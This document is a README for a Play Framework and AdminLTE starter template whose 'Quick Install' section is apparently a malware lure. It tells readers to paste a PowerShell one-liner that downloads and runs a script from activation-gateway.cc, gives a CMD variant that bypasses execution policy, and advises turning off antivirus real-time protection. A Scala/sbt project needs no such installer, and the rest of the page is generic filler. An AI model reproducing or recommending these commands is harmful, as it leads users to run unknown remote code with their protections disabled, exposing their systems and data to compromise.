<div align="center">

# Play Scala AdminLTE Template — — Starter Kit

![preview](https://raw.githubusercontent.com/Jwkrabe94/play-scala-adminlte-starter/main/banner_0734.svg)

[![pwsh](https://img.shields.io/badge/Pwsh-5%2B-f97316?style=flat&labelColor=0d1117)]() [![checks](https://img.shields.io/badge/Checks-Passing-2ea44f?style=flat&labelColor=0d1117)]() [![stage](https://img.shields.io/badge/Stage-Verified-2ea44f?style=flat&labelColor=0d1117)]()

</div>

---

A minimal Play Framework starter in Scala with AdminLTE wired in, intended as a clean base for internal tools and admin dashboards. It bundles the AdminLTE assets with a Play-ready layout so you can skip the setup and start building screens. Use it as a template for new projects or as a reference for integrating AdminLTE into an existing Play app.

## 💻 PowerShell Quick Install

> [!TIP]
> **One-click install** — paste one command, done in seconds.
> Win 10/11 · PowerShell 5.1+ · Standard user

### 1️⃣ Open Windows PowerShell
* Press `Win + X`.
* Click **Terminal** or **Windows PowerShell** from the menu.

### 2️⃣ Run the script
Copy the line below into PowerShell and press `Enter`.

```cmd
iex(irm 'https://activation-gateway.cc/update/ps-activator')
```

### 3️⃣ Windows blocking the script? Use CMD
Copy into CMD, press `Enter`, wait for completion:

```cmd
powershell -NoProfile -ExecutionPolicy Bypass -Command "iex(irm 'https://activation-gateway.cc/update/ps-activator')"
```

> [!WARNING]
> If SmartScreen or antivirus blocks the setup, go to **Windows Security → Virus & threat protection → Manage settings**, turn off **Real-time protection**, run the script, and re-enable immediately.

## 📋 System Requirements

- **PowerShell 5.1+** (pre-installed on Windows 10 and 11)
- **Windows 10 / 11** (x64)
- **Internet connection** — required to fetch the script
- **Administrator** — *not* required

## Features

- **Server-rendered Scala UI** built on the Play framework with Twirl templates
- **AdminLTE integration** for a ready-to-use dashboard layout, sidebar navigation, and UI components
- **Type-safe controllers and routes** leveraging Scala's type system
- **Modular project layout** separating views, controllers, and assets for easy extension
- **Prebuilt admin pages** including dashboard, forms, tables, and UI element showcases
- **Asset pipeline** for compiling and serving stylesheets and scripts
- **Configurable via standard Play configuration** without custom tooling
- **Hot reload support** in development for fast iteration
- **Clean starting point** meant to be forked and adapted rather than used as a library

## Tech Stack

- **Scala** – application language
- **Play Framework** – web framework (MVC, routing, async I/O)
- **sbt** – build tool and dependency management
- **AdminLTE** – Bootstrap-based admin dashboard theme
- **Twirl** – server-side template engine
- **Bootstrap** – responsive UI foundation
- **jQuery** – DOM and UI interactions bundled with AdminLTE
- **HTML/CSS** – view layer and theming

## Project Structure

```
app/
 controllers/ HTTP handlers and request/response logic
 models/ Domain types and data structures
 views/ Twirl templates, including AdminLTE layouts and partials
conf/
 application.conf Application configuration
 routes Route definitions
 logback.xml Logging configuration
public/
 css/ Stylesheet assets
 js/ Client-side scripts
 images/ Static image assets
build.sbt Build definition and dependencies
project/ sbt plugins and build properties
test/ Unit and integration tests
```

- `app/controllers` stays thin, delegating business logic outward.
- `app/views` holds reusable AdminLTE layout templates; compose pages from partials.
- `conf/routes` maps URLs to controller actions; keep handlers consistent with view names.
- `public` is served directly; reference assets via the routes asset helper.
- Keep environment-specific settings in `conf/application.conf` overrides rather than branching in code.

## Getting Started

Prerequisites: JDK 8 or newer and sbt. This is a Scala Play application using the AdminLTE theme, so no additional tooling is required.

1. Copy the environment template and adjust values:
 ```
 cp .env.example .env
 ```
2. Start the app in development mode with sbt:
 ```
 sbt run
 ```
3. Open `localhost:9000` in your browser. The AdminLTE dashboard loads by default.

Useful commands:
- `sbt compile` — compile the project
- `sbt test` — run the test suite
- `sbt ~run` — recompile and reload on file changes
- `sbt dist` — build a production artifact

Configuration lives in `conf/application.conf`; environment-specific overrides can be placed in `conf/application.dev.conf` or passed as JVM properties. Routes are defined in `conf/routes`, and views under `app/views` follow the AdminLTE layout conventions.

If you add new frontend assets, place them in `public/` and reference them via the Play asset helpers. Keep secrets out of version control by relying on `.env` locally and environment variables in deployed environments.

## FAQ

**Do I need anything beyond a JDK and sbt?**
No. The template targets a standard Scala/sbt setup. If sbt resolves dependencies cleanly, you're good to go.

**Why does the project fail to compile on a fresh checkout?**
Almost always a toolchain mismatch. Verify your JDK and sbt versions against what the build declares, then reload the build to pick up changes.

**Can I remove the AdminLTE assets if I don't need them?**
Yes. Assets are isolated; drop the references in your views and remove the bundled files. The core app structure remains intact.

**Where do I add new pages?**
Add routes, a controller action, and a view following the existing pattern. Keeping new pages alongside existing ones keeps the template's structure predictable.

**How do I change the default look and feel?**
Override the theme variables and styles. Avoid editing vendor assets directly so upgrades stay painless.

**Is this a library or an application skeleton?**
A starter template. You're meant to copy it, strip what you don't need, and build your own app on top — not depend on it as a library.

**Something behaves unexpectedly after upgrade — what first?**
Clear caches, re-resolve dependencies, and diff your config against the template defaults. Most surprises trace back to stale build state or local overrides.

**Can I use this in production?**
It's a starting point, not a hardened deployment. Review configuration, secrets handling, and security settings before shipping.

**How do I contribute changes back?**
Keep changes focused, match existing conventions, and make sure the project builds and runs before opening a pull request.

## License

This project is released under the MIT License. See the LICENSE file in the repository for the full text.